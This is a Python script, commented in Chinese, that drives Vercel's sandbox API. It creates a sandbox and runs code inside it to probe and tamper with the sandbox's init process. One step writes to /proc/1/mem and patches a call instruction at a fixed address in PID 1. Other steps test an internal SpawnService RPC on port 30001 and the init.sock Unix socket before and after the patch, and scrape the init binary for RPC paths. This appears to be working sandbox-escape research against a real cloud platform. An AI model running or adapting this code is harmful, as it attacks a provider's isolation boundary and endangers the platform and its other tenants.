# 实验J232: 对照实验 (patch前后30001 POST行为) + init.sock细测 + 找RPC路径
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=40000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 120})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj232"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

bashfile(sid, "cp /run/vercel/share/sandbox-init /tmp/si", "PREP", 1000)

# A) 对照组: 无patch POST connect JSON 30001
CODE_A = '''import urllib.request
req = urllib.request.Request("http://127.0.0.1:30001/vercel.sandbox.spawn.v1.SpawnService/Ping", data=b"{}", method="POST")
req.add_header("Content-Type", "application/json")
req.add_header("Connect-Protocol-Version", "1")
try:
    r = urllib.request.urlopen(req, timeout=6)
    print("HTTP", r.status, r.read()[:500], flush=True)
except Exception as e:
    print("EXC", type(e).__name__, str(e)[:300], flush=True)
print("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_CTRL_POST", timeout=100)
time.sleep(1)

# B) patch
CODE_B = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x83afe0, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("e8bb030000"):
    wa(0x83afe0, bytes.fromhex("31c0909090"))
print("NEW", ra(0x83afe0, 5).hex(), flush=True)
print("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_PATCH", timeout=100)
time.sleep(1)

# C) patch后 POST connect JSON 30001
CODE_C = CODE_A.replace("DONE_A", "DONE_C")
run_cmd(sid, CODE_C, "C_POST_PATCHED", timeout=100)
time.sleep(1)

# D) patch后 init.sock: POST send后不recv
CODE_D = '''import socket, time
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(2)
try:
    s.connect("/run/vercel/share/init.sock")
    print("C_OK", flush=True)
    n = s.send(b"POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\r\\nHost: x\\r\\nContent-Type: application/json\\r\\nConnect-Protocol-Version: 1\\r\\nContent-Length: 2\\r\\n\\r\\n{}")
    print("SENT", n, flush=True)
    time.sleep(2)
    print("ALIVE", flush=True)
except Exception as e:
    print("ERR", type(e).__name__, str(e)[:150], flush=True)
print("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_SOCK_SEND", timeout=100)
time.sleep(1)

# E) init.sock: GET
CODE_E = '''import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(3)
try:
    s.connect("/run/vercel/share/init.sock")
    print("C_OK", flush=True)
    s.send(b"GET / HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n")
    d = b""
    try:
        while True:
            b2 = s.recv(4096)
            if not b2:
                break
            d += b2
    except Exception as e:
        print("RE", type(e).__name__, flush=True)
    print("RESP", d[:400].decode(errors="replace"), flush=True)
except Exception as e:
    print("ERR", type(e).__name__, str(e)[:150], flush=True)
print("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_SOCK_GET", timeout=100)
time.sleep(1)

# F) 找 RPC 路径字符串: 二进制里搜 SpawnService / 含斜杠路径
CODE_F = r'''
import re
data = open("/tmp/si", "rb").read()
seen = set()
for m in re.finditer(rb"[\x20-\x7e]{8,}", data):
    s = m.group()
    if (b"Spawn" in s or b"vercel.sandbox" in s or b"/" in s) and b"go" != s:
        if b"vercel" in s or b"Spawn" in s or s.startswith(b"/"):
            if s not in seen:
                seen.add(s)
                print(repr(s.decode(errors="replace"))[:200], flush=True)
print("DONE_F", flush=True)
'''
run_cmd(sid, CODE_F, "F_STRINGS", timeout=150)
time.sleep(1)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
